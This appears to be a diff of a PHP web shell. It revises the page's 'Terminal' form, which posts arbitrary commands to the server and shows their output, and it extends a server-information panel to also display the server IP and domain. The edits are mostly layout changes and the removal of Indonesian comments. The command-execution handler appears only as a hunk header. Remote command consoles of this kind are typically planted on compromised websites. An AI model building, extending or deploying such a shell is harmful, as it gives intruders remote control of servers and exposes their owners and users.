@@ -3897,22 +3897,24 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         </div>
     </div>
 
-    <!-- Server Info Section -->
-    <div class="server-info mt-5">
-        <h3>Server Information</h3>
-        <ul>
-            <li><strong>Hostname:</strong> <?php echo gethostname(); ?></li>
-            <li><strong>Operating System:</strong> <?php echo php_uname(); ?></li>
-            <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
-        </ul>
-    </div>
+  <!-- Server Info Section -->
+<div class="server-info mt-5" style="display: inline-block; vertical-align: top; width: 48%; padding-right: 10px;">
+    <h3>Server Information</h3>
+    <ul>
+        <li><strong>Hostname:</strong> <?php echo gethostname(); ?></li>
+        <li><strong>Operating System:</strong> <?php echo php_uname(); ?></li>
+        <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
+        <li><strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?></li>
+        <li><strong>Server Domain:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></li>
+    </ul>
+</div>
 
 
-<div class="terminal-input mt-5">
-    <li style="margin-left: 35px;"><strong>Terminal:</strong></li>
+<div class="terminal-input mt-5" style="display: inline-block; vertical-align: top; width: 48%;">
+    <li style="margin-left: 30px;"><strong>Terminal:</strong></li>
     <form method="post" id="terminalForm" style="margin-left: 20px;">
         <!-- Resize the textarea with smaller size -->
-        <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 20px; width: 30%; margin-bottom: 10px;" placeholder="Enter Command.."></textarea>
+        <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 20px; width: 100%; margin-bottom: 10px;" placeholder="Enter Command.."></textarea>
         <button type="submit" class="btn btn-primary mt-3" style="font-size: 13px; padding: 3px 5px; margin-top: 10px;">Run Command</button>
     </form>
         
@@ -3925,7 +3927,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
 <script>
     $(document).ready(function() {
         $('#terminalForm').on('submit', function(e) {
-            e.preventDefault(); // Mencegah form dari reload halaman
+            e.preventDefault(); 
             
             var input = $('#terminalInput').val().trim();
 
@@ -3940,7 +3942,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
                 type: 'POST',
                 data: { command: input },
                 success: function(response) {
-                    // Menampilkan hasil output dari server
+                    
                     var outputStart = response.indexOf("<pre id=\"terminalOutput\">") + 25; 
                     var outputEnd = response.indexOf("</pre>");
                     var output = response.substring(outputStart, outputEnd);
